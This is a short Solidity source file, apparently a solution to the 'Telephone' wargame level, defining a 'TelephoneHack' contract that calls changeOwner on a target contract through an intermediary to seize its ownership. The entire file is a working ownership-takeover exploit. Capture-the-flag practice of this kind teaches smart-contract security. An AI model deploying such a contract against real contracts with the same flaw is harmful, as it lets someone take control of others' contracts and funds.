// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    function attack(address telephone, address newOwner) external {
        ITelephone(telephone).changeOwner(newOwner);
    }
}

